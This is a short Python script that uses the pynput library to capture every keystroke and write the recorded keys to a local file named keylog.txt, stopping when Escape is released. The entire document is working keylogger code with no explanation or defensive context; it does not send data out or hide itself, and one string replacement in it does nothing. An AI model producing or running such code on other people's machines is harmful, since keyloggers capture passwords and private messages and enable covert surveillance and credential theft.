from pynput.keyboard import Key, Listener
the_keys = []
def functionPerKey(key):
    the_keys.append(key)
    storeKeysToFile(the_keys)
def storeKeysToFile(keys):
    with open("keylog.txt","w") as log:
        for the_key in keys:
            the_key_str = str(the_key).replace("","")
            log.write(the_key_str)
def onEachKeyRelease(the_keys):
    if the_keys == Key.esc:
        return False
with Listener(on_press=functionPerKey,on_release=onEachKeyRelease) as the_listener:
    the_listener.join()